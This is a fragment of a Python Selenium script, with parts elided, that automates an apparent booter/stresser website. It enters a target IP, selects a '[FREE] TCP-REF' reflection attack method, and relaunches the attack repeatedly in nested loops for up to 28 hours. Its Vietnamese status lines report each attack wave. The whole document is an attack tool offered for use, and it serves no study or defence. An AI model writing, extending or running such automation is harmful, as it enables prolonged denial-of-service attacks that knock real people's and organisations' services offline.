...
while True:
 time.sleep(2)
 driver.find_element_by_id('attack_target').send_keys(f"{ip}")
 time.sleep(1)
 select = Select(driver.find_element_by_id('attack_methods'))
 select.select_by_visible_text('[FREE] TCP-REF')
 time.sleep(1)
 ...
 for i in range(280,0,-1):
    os.system("cls")
    print(f" 4H Đang Tấn Công IP: {ip}, Đợt Tấn Công Thứ {a} Kết Thúc Sau: {i}", end="\r", flush=True)
    time.sleep(1)
 if a == 50:
    driver.find_element_by_class_name('user-img-radious-style').click()
    time.sleep(2)
    ...
    while True:
     ...
     for i in range(280,0,-1):
        os.system("cls")
        print(f" 8H Đang Tấn Công IP: {ip}, Đợt Tấn Công Thứ {b} Kết Thúc Sau: {i}", end="\r", flush=True)
        time.sleep(1)
     if b == 50:
        driver.find_element_by_class_name('user-img-radious-style').click()
        time.sleep(2)
        ...
        while True:
         ...
         for i in range(280,0,-1):
            os.system("cls")
            print(f" 12H Đang Tấn Công IP: {ip}, Đợt Tấn Công Thứ {c} Kết Thúc Sau: {i}", end="\r", flush=True)
            time.sleep(1)
         if c == 50:
            driver.find_element_by_class_name('user-img-radious-style').click()
            time.sleep(2)
            ...
            while True:
             ...
             for i in range(280,0,-1):
                os.system("cls")
                print(f" 16H Đang Tấn Công IP: {ip}, Đợt Tấn Công Thứ {d} Kết Thúc Sau: {i}", end="\r", flush=True)
                time.sleep(1)
             if d == 50:
                driver.find_element_by_class_name('user-img-radious-style').click()
                time.sleep(2)
                ...
                while True:
                 ...
                 for i in range(280,0,-1):
                    os.system("cls")
                    print(f" 20H Đang Tấn Công IP: {ip}, Đợt Tấn Công Thứ {e} Kết Thúc Sau: {i}", end="\r", flush=True)
                    time.sleep(1)
                 if e == 50: 
                    driver.find_element_by_class_name('user-img-radious-style').click()
                    time.sleep(2)
                    ...
                    while True:
                     ...
                     for i in range(280,0,-1):
                        os.system("cls")
                        print(f" 24H Đang Tấn Công IP: {ip}, Đợt Tấn Công Thứ {f} Kết Thúc Sau: {i}", end="\r", flush=True)
                        time.sleep(1)
                     if f == 50:
                        driver.find_element_by_class_name('user-img-radious-style').click()
                        time.sleep(2)
                        ...
                        while True:
                         ...
                         for i in range(280,0,-1):
                            os.system("cls")
                            print(f" 28H Đang Tấn Công IP: {ip}, Đợt Tấn Công Thứ {g} Kết Thúc Sau: {i}", end="\r", flush=True)
                            time.sleep(1)
                         if g == 50:
                             break   
